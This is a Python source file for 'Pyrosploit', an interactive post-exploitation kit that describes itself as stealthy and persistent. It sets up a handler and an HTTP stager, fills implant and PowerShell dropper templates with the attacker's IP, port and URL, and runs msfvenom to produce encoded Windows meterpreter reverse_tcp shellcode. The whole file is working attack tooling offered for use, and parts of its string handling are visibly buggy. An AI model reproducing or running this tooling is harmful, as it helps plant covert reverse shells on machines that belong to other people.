#!/usr/bin/python3
import os
import socket
import pyterpreter
import lib
from termcolor import colored


def pyrosploit_help():
    print('''
Welcome to Pyrosploit!!!
This is a stealthy payload generation and handling kit
the main intended use case is to use it after you have gained Code Execution on a machine
you can then use this to set up stealthy and persistent shells with some meterpreter like goodies (not many don't get your hopes up)

below is a list of commands using the commands is as simple as typing the command, if you want more information on the command please type command help
generally speaking the order you should execute in is:
 1. attacker_setup
 2. target_setup (if needed, most the time you can skip this)
 3. handler_setup
 4. stager_setup
 5. pyterpreter_generate
 6. stager_start
 7. handler_start
and at this point you should be trying to get a connection back!

good hunting!!

''')
    for i in lib.commands:
        print(i.name)

############################################# Base Commands ##############################################

############################################## Quick Start ###############################################
quick_start_help = '''
this is a command to get everything up and running for you.
'''
def quick_start_function():
    quick_start_run()

quick_start = lib.command(quick_start_help, 'quick_start', quick_start_function, False)

############################################# handler commands ##############################################

############################################## handler setup ################################################
handler_setup_help = '''
This is a command to set up the pyterpreter handler server
it will prompt you for everything you need.
'''
def handler_set_run():
    port = input("port for handler? $> ")
    global handler_server
    handler_server = lib.server(attacker.ip, port, 'handler')

handler_setup = lib.command(handler_setup_help, 'handler_setup', handler_set_run, False)
############################################# handler run ######################################################
handler_run_help = '''
This requires a handler_server object be present.
'''
def handler_run_function():
    handler_server.start()

handler_run = lib.command(handler_run_help, 'handler_run', handler_run_function, False)
##############################################################################################################

############################################### Stager Commands ##############################################

############################################### stager_setup #################################################
stager_setup_help = '''
This command gathers information needed for the stager server
This command requires no args, and will prompt for what it needs
'''
def stager_setup_function():
    port = input("port? $> ")
    global stager
    stager = lib.server(attacker.ip, port, 'http')

stager_setup = lib.command(stager_setup_help, 'stager_setup', stager_setup_function, False)

############################################# stager_run ####################################################
stager_run_help = '''
This command runs the stager, this assumes you've already run stager_setup
This command requires no args.
'''
def stager_run_function():
    stager.start()
stager_run = lib.command(stager_run_help, 'stager_run', stager_run_function, False)

############################################## stager_stop ###################################################
stager_stop_help = '''
This command stops the stager, this assumes you've already run stager_setup, and Stager_run
'''
def stager_stop_function():
    stager.stop()
stager_stop = lib.command(stager_stop_help, 'stager_stop', stager_stop_function, False)
###############################################################################################################

############################################## Pyterpreter commands ##########################################

############################################## pyterpreter_generate #############################################
pyterpreter_generate_help = '''
This command generates the pyterpeter file for you to use
This command does not require any args.
'''
def pyterpreter_generate_function():
    if attacker.public == False:
        format_pyterpreter(attacker, handler_server, stager)
    elif attacker.public == True:
        format_pyterpreter(public_machine, handler_server, stager)
pyterpreter_generate = lib.command(pyterpreter_generate_help, 'pyterpreter_generate', pyterpreter_generate_function, False)

#############################################################################################################################
#############################################################################################################################

################################################# Pytruder commands #########################################################

################################################# Pyrtuder_format ###########################################################
pytruder_format_help = '''
This command formats pytruder.ps1 for deployement, the only thing it needs to really change is the URL
This command does not require any args.
'''
def pytruder_format_ps1_funciton():
    if attacker.public == False:
        format_pytruder('ps1', attacker)
    elif attacker.public == True:
        format_pytruder('ps1', public_machine)
pytruder_format_ps1 = lib.command(pytruder_format_help, 'pytruder_format', pytruder_format_ps1_funciton, False)

#############################################################################################################################

################################################ Shell Code Commands ########################################################
################################################ Shell Code Generate ########################################################
shellcode_generate_help = '''
this command generates shellcode based off of already given data, the shell code with be meterpreter
THis command does no require any args.
'''
def shellcode_generate_function():
    if attacker.public == False:
        server = attacker
    elif attacker.public == True:
        server = public_machine
    shellcode = os.popen('msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST={} LPORT={} -i 5 -f py'.format(server.ip,input("port metasploit is listening on? $> "))).read()
    badchars = ['+', '=', 'b""' ',']
    output = []
    for char in badchars:
        shellcode = shellcode.split(char)
        ''.join(shellcode)
    shellcode = shellcode.split('\n')
    for line in shellcode:
        outline = line[1:]
        output.append(outline)
    '\n'.join(output)
    with open('./stager/shellcode.txt', 'w') as f:
        f.write(output)
shellcode_generate = lib.command(shellcode_generate_help, 'shellcode_generate', shellcode_generate_function, False)
    

##############################################################################################################################


def get_attacker_info():
    os.system('ifconfig')
    ip = input("ip of interface to use? $>")
    attacker = lib.machine(ip, 'attacker')
    return attacker

def get_target_info():
    ip = input("ip address of the target?")
    target = lib.machine(ip, 'target')
    return target

def get_server_info(attacker, protocol):
    port = input("port for server? $> ")
    return lib.server(attacker.ip, port, protocol)


def format_pyterpreter(attacker, listener, stager):
    with open('./pyterpreter/pyterpreter.py', 'r') as f:
        output = []
        for line in f:
            if "$IP" in line:
                line = line.split("$IP")
                line = attacker.ip.join(line)
                output.append(line)
            elif "$PORT" in line:
                line = line.split("$PORT")
                line = listener.port.join(line)
                output.append(line)
            output.append(line)
        with open("stager/pyterpreter.py", 'w') as x:
            output = '\n'.join(output)
            x.write(output)

def format_pytruder(format, server):
    if not stager:
        print("you need to set up the stager first")
    else:
        url = "http://{}:{}".format(server.ip, stager.port)
        if format == 'sh':
            pytruder = './pytruder/pytruder.sh'
        elif format == 'py':
            pytruder = './pytruder/pytruder.py'
        elif format == 'ps1':
            pytruder = './pytruder/pytruder.ps1'
        else:
            print("error: unknown pytruder format")
            return
        with open(pytruder, 'r') as f:
            output = []
            for line in f:
                try:
                    line = line.split('$URL')
                    line = url.join(line)
                    output.append(line)
                except:
                    output.append(line)
            with open('stager/pytruder.{}'.format(format), 'w') as x:
                output = '\n'.join(output)
                x.write(output)


def quick_start_run():
    print("stager_setup")
    stager_setup_function()
    print("handler_setup")
    handler_set_run()
    print("pyterpreter_generate")
    pyterpreter_generate_function()
    print("pytruder_format")
    pytruder_format_ps1_funciton()
    print("stager_run")
    stager_run_function()
    print("handler_run")
    handler_run_function()


def main():
    global attacker
    attacker = get_attacker_info()
    global target
    target = get_target_info()
    print('''
    1. Normal
    2. Portfowarded
    ''')
    connection_type = input("connection type selection? $> ")
    if connection_type == '2':
        public_ip = input('public IP address for connecting back? $>')
        attacker.public = True
        global public_machine
        public_machine = lib.machine(public_ip, 'public')
    while True:
        com = input('$> ').split(' ')
        if com[0] == 'help':
            pyrosploit_help()
        elif len(com[0]) == 0:
            pass
        elif com[0] == 'exit':
            break
        else:
            success = False
            for i in lib.commands:
                if i.name == com[0]:
                    if len(com) == 2:
                        if com[1] == 'help':
                            i.help()
                            success = True
                        else:
                            print(colored('error, unknown argument', 'red'))
                    elif len(com) == 1:
                        i.run()
                        success = True
            if success == False:
                print(colored('error, unknown command', 'red'))
                
    try:
        os.system('pkill python')
    except:
        pass
    print(colored("thank you for using Pyrosploit", "green"))


if __name__ == '__main__':
    main()

